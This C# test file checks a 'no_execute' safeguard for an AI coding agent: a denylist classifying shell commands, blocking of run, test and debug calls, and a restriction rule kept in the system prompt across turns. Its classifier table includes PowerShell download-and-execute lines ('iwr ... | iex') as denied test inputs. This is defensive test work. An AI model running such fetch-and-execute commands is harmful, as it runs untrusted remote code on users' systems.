// File: NoExecuteTests.cs  v1.0
// Copyright (c) iOnline Consulting LLC. All rights reserved.
//
// Tests for the caller-imposed no_execute restriction on delegated tasks.
//   * IsExecutableCommand — the run_shell denylist (allowed vs denied table)
//   * BufferedAgenticHost.NoExecute — the three spawn surfaces are gated when
//     true; the false path is byte-for-byte the pre-change behavior
//   * HeadlessSession — the no-execution rule is in the system prompt on EVERY
//     turn (the rule is re-built per iteration and the session is retained across
//     continuations, so it cannot be forgotten on turn N+1)
//
// No test here spawns anything capable of hanging: the noExecute=true tests are
// blocked BEFORE any spawn, and the noExecute=false tests use only `echo`.

using System.Collections.Generic;
using System.Text;
using Xunit;

namespace DevMind.Core.Tests
{
    // ── IsExecutableCommand: the run_shell denylist ─────────────────────────

    public class IsExecutableCommandTests
    {
        [Theory]
        // Builds stay allowed — run_build is the verification path no_execute must NOT kill.
        [InlineData("dotnet build", false)]
        [InlineData("dotnet build MySolution.slnx", false)]
        [InlineData("npm run build", false)]
        [InlineData("dotnet restore", false)]
        [InlineData("git status", false)]
        [InlineData("git log --oneline -5", false)]
        [InlineData("dir", false)]
        [InlineData("Get-ChildItem src", false)]
        // Explicit run/exec/test invocations.
        [InlineData("dotnet run", true)]
        [InlineData("dotnet run --project DevMind.Cli", true)]
        [InlineData("dotnet exec app.dll", true)]
        [InlineData("dotnet test", true)]
        [InlineData("dotnet test DevMind.Core.Tests.csproj", true)]
        // Built artifacts run directly.
        [InlineData(".\\foo.exe", true)]
        [InlineData("C:\\build\\out\\app.exe", true)]
        [InlineData("dotnet bin\\Debug\\net10.0\\app.dll", true)]
        // Script interpreters.
        [InlineData("python x.py", true)]
        [InlineData("python -c \"print(1)\"", true)]
        // Deliberately-ambiguous case, classified DENIED on purpose: `python --version`
        // is inspection, not execution — but ANY invocation of a script interpreter CAN
        // execute code, and a denylist that special-cases --version invites the next
        // --version-but-really-executes variant. The denylist errs on the safe side and
        // says plainly what is denied (the guarantee is the layer, not the pattern).
        [InlineData("python --version", true)]
        [InlineData("node server.js", true)]
        [InlineData("node -e \"process.exit(0)\"", true)]
        // npm: build allowed, run/test denied.
        [InlineData("npm run start", true)]
        [InlineData("npm test", true)]
        [InlineData("yarn test", true)]
        // Script files run directly.
        [InlineData("powershell -File .\\deploy.ps1", true)]
        [InlineData(".\\run.bat", true)]
        [InlineData("cmd /c build.cmd", true)]
        // Download-then-execute: a command that both downloads (iwr /
        // Invoke-WebRequest) AND executes (iex / Invoke-Expression) is denied even
        // when the two are not literally piped together — the classifier is substring
        // based, and the safe reading of "download AND invoke" is to treat it as
        // execution (the pipe is the common case, but `; Invoke-Expression` is the
        // bypass the classifier should catch too).
        [InlineData("iwr https://x.example/install.ps1 | iex", true)]
        [InlineData("Invoke-WebRequest -Uri u -OutFile t; Invoke-Expression t", true)]
        // Download without invoke is just a download — allowed.
        [InlineData("iwr https://x.example/notes.txt -OutFile notes.txt", false)]
        // Plain expression without download is not classified — allowed.
        [InlineData("Invoke-Expression $env:PATH", false)]
        public void Classifies(string command, bool executable)
        {
            bool actual = LoopHelpers.IsExecutableCommand(command);
            Assert.True(actual == executable,
                $"IsExecutableCommand(\"{command}\") returned {actual}, expected {executable}");
        }

        [Fact]
        public void EmptyOrNull_IsNotExecutable()
        {
            Assert.False(LoopHelpers.IsExecutableCommand(null!));
            Assert.False(LoopHelpers.IsExecutableCommand(""));
            Assert.False(LoopHelpers.IsExecutableCommand("   "));
        }
    }

    // ── BufferedAgenticHost.NoExecute: the three spawn surfaces ─────────────

    public class NoExecuteHostTests : IDisposable
    {
        private readonly string _dir;

        public NoExecuteHostTests()
        {
            _dir = Path.Combine(Path.GetTempPath(), $"devmind_noexec_{Guid.NewGuid():N}");
            Directory.CreateDirectory(_dir);
        }

        public void Dispose() => Directory.Delete(_dir, recursive: true);

        // ── noExecute=true blocks each surface with a caller-imposed message ──

        [Theory]
        [InlineData("dotnet run")]
        [InlineData(".\\app.exe")]
        [InlineData("python x.py")]
        [InlineData("npm run start")]
        public async Task NoExecuteTrue_BlocksDenylistedShellCommand_WithCallerImposedMessage(string command)
        {
            var host = new BufferedAgenticHost(_dir) { NoExecute = true };
            var (exitCode, output) = await ((IAgenticHost)host).RunShellAsync(command);

            Assert.Equal(1, exitCode);
            // The message must state this is the CALLER's restriction on THIS task and
            // correct the false premise (DevMind is capable; this job may not).
            Assert.Contains("[BLOCKED]", output);
            Assert.Contains("delegating caller", output);
            Assert.Contains("no_execute", output);
            Assert.Contains("this job", output, StringComparison.OrdinalIgnoreCase);
            // Prescribes the build path, and never a workaround that would spawn.
            Assert.Contains("build", output);
            // Journaled as a block, not a shell action.
            Assert.Contains(host.GetActions(), a => a.Kind == "blocked");
            Assert.DoesNotContain(host.GetActions(), a => a.Kind == "shell");
        }

        [Fact]
        public async Task NoExecuteTrue_BlocksRunTests()
        {
            var host = new BufferedAgenticHost(_dir) { NoExecute = true };
            string output = await ((IAgenticHost)host).RunTestsAsync(null, null, null);

            Assert.Contains("[BLOCKED]", output);
            Assert.Contains("delegating caller", output);
            Assert.Contains("test", output);
            Assert.Contains(host.GetActions(), a => a.Kind == "blocked");
        }

        [Fact]
        public async Task NoExecuteTrue_BlocksDebug()
        {
            var host = new BufferedAgenticHost(_dir) { NoExecute = true };
            string output = await ((IAgenticHost)host).RunDebugAsync(
                "launch", new Dictionary<string, string> { ["project"] = "x.csproj" });

            Assert.Contains("[BLOCKED]", output);
            Assert.Contains("delegating caller", output);
            Assert.Contains(host.GetActions(), a => a.Kind == "blocked");
        }

        // ── Builds pass through even with noExecute=true ─────────────────────

        [Fact]
        public async Task NoExecuteTrue_AllowsBuildCommands()
        {
            var host = new BufferedAgenticHost(_dir) { NoExecute = true };
            // `echo` is allowed and exits immediately — it stands in for the build path
            // (the classifier table pins `dotnet build` / `npm run build` as non-executable).
            var (exitCode, output) = await ((IAgenticHost)host).RunShellAsync("echo build-ok");

            Assert.Equal(0, exitCode);
            Assert.DoesNotContain("[BLOCKED]", output);
            Assert.Contains("build-ok", output);
        }

        // ── noExecute=false leaves behavior byte-for-byte unchanged ──────────
        // The default must be the pre-change behavior: the guard is a no-op and
        // every command reaches the shell runner exactly as before. (Only `echo`
        // is used — it exits immediately and can never hang.)

        [Fact]
        public async Task NoExecuteFalse_ShellBehaviorUnchanged()
        {
            var host = new BufferedAgenticHost(_dir) { NoExecute = false };
            var (exitCode, output) = await ((IAgenticHost)host).RunShellAsync("echo plain-run");

            Assert.Equal(0, exitCode);
            Assert.Contains("plain-run", output);
            Assert.DoesNotContain("[BLOCKED]", output);
            // Journaled as a normal shell action.
            Assert.Contains(host.GetActions(), a => a.Kind == "shell");
            Assert.DoesNotContain(host.GetActions(), a => a.Kind == "blocked");
        }

        [Fact]
        public async Task NoExecuteFalse_RunTestsBehaviorUnchanged()
        {
            // With NoExecute false, RunTestsAsync reaches the pre-existing
            // "no project and no .csproj" early return — the guard did not intercept it.
            var host = new BufferedAgenticHost(_dir) { NoExecute = false };
            string output = await ((IAgenticHost)host).RunTestsAsync(null, null, null);

            Assert.DoesNotContain("[BLOCKED]", output);
            Assert.DoesNotContain("delegating caller", output);
            Assert.Contains("No project specified", output);
        }

        [Fact]
        public async Task NoExecuteFalse_DebugBehaviorUnchanged()
        {
            // With NoExecute false, the pre-existing console-skin "debug only in TUI"
            // message is what comes back — the guard did not intercept it.
            var host = new BufferedAgenticHost(_dir) { NoExecute = false };
            string output = await ((IAgenticHost)host).RunDebugAsync(
                "launch", new Dictionary<string, string> { ["project"] = "x.csproj" });

            Assert.Contains("only available in the DevMind TUI", output);
            Assert.DoesNotContain("delegating caller", output);
        }
    }

    // ── HeadlessSession: the rule is in the system prompt, on every turn ────

    public class NoExecuteSessionTests : IDisposable
    {
        private readonly string _dir;

        public NoExecuteSessionTests()
        {
            _dir = Path.Combine(Path.GetTempPath(), $"devmind_noexec_session_{Guid.NewGuid():N}");
            Directory.CreateDirectory(_dir);
        }

        public void Dispose() => Directory.Delete(_dir, recursive: true);

        private static HeadlessOptions Options(int maxDepth = 5) => new HeadlessOptions
        {
            RequestTimeoutMinutes = 1,
            FirstTokenTimeoutMinutes = 1,
            ManualContextSize = 32768, // skip context probes
            AgenticLoopMaxDepth = maxDepth,
        };

        [Fact]
        public void NoExecuteRule_TextNamesRestrictionAndBuildsPath()
        {
            Assert.Contains("NO-EXECUTION RESTRICTION", HeadlessAgent.NoExecuteRule);
            Assert.Contains("delegating caller", HeadlessAgent.NoExecuteRule);
            Assert.Contains("dotnet build", HeadlessAgent.NoExecuteRule);
            // Must correct the false premise: this is a restriction, not a limitation.
            Assert.Contains("not a DevMind limitation", HeadlessAgent.NoExecuteRule);
        }

        [Fact]
        public async Task NoExecuteFalse_RuleAbsentFromSystemPrompt()
        {
            using var server = new FakeSseServer();
            server.SseQueue.Add(FakeSseServer.BuildToolCallSse("task_done",
                "{\"summary\":\"done\"}"));

            string? prior = Environment.GetEnvironmentVariable("DEVMIND_SERVER_TYPE");
            Environment.SetEnvironmentVariable("DEVMIND_SERVER_TYPE", "llama");
            try
            {
                using var session = new HeadlessSession(Options(), server.BaseUrl, apiKey: null!,
                    workingDirectory: _dir, buildCommand: "dotnet build", noExecute: false);
                var result = await session.RunTurnAsync("Say done.", ct: CancellationToken.None);
                Assert.Null(result.Error);

                // The single chat request must NOT carry the no-execution rule.
                Assert.Equal(1, server.RequestBodies.Count);
                Assert.DoesNotContain("NO-EXECUTION RESTRICTION", server.RequestBodies[0]);
            }
            finally
            {
                Environment.SetEnvironmentVariable("DEVMIND_SERVER_TYPE", prior);
            }
        }

        [Fact]
        public async Task NoExecuteTrue_RulePresentOnEveryTurn_AndDenylistedShellIsBlocked()
        {
            using var server = new FakeSseServer();
            // Turn 1: the model tries to run a built app — the harness blocks it
            // (no process is actually spawned), then task_done. Turn 2: the
            // CONTINUATION on the same retained session — the rule must still be
            // in the system prompt (the "forgotten on the next turn" failure mode).
            server.SseQueue.Add(FakeSseServer.BuildToolCallSse("run_shell",
                "{\"command\":\"dotnet run\"}"));
            server.SseQueue.Add(FakeSseServer.BuildToolCallSse("task_done",
                "{\"summary\":\"Blocked as expected.\"}"));
            server.SseQueue.Add(FakeSseServer.BuildToolCallSse("task_done",
                "{\"summary\":\"Done on turn two.\"}"));

            string? prior = Environment.GetEnvironmentVariable("DEVMIND_SERVER_TYPE");
            Environment.SetEnvironmentVariable("DEVMIND_SERVER_TYPE", "llama");
            try
            {
                using var session = new HeadlessSession(Options(), server.BaseUrl, apiKey: null!,
                    workingDirectory: _dir, buildCommand: "dotnet build", noExecute: true);

                var first = await session.RunTurnAsync("Try to run the app.", ct: CancellationToken.None);
                Assert.Null(first.Error);
                Assert.Equal("Blocked as expected.", first.Answer);

                // Turn 1: the blocked command's tool result reached the model.
                string turn1ResultRequest = server.RequestBodies[1];
                Assert.Contains("[BLOCKED]", turn1ResultRequest);
                Assert.Contains("delegating caller", turn1ResultRequest);

                var second = await session.RunTurnAsync("continue", ct: CancellationToken.None);
                Assert.Null(second.Error);
                Assert.Equal("Done on turn two.", second.Answer);

                // Every chat request on BOTH turns carries the rule — BuildSystemPrompt
                // runs per iteration, so turn 2 (the continuation) cannot have lost it.
                foreach (string body in server.RequestBodies)
                    Assert.Contains("NO-EXECUTION RESTRICTION", body);
            }
            finally
            {
                Environment.SetEnvironmentVariable("DEVMIND_SERVER_TYPE", prior);
            }
        }
    }
}
